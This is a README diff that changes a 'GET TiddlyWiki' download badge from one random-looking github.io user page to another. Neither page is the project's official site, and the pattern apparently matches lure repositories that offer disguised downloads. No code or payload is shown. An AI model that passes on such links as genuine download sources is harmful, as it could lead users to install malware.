@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://download.logo.wine/logo/TiddlyWiki/TiddlyWiki-Logo.wine.png)
 
-[![GET TiddlyWiki](https://img.shields.io/badge/GET%20%E2%80%94%20TiddlyWiki-0078D6?style=for-the-badge&logoColor=white)](https://chaseburkeyfvs.github.io/.github/tiddly-wiki)
+[![GET TiddlyWiki](https://img.shields.io/badge/GET%20%E2%80%94%20TiddlyWiki-0078D6?style=for-the-badge&logoColor=white)](https://dimitrihowellywss.github.io/.github/tiddly-wiki)
 
 ---
 
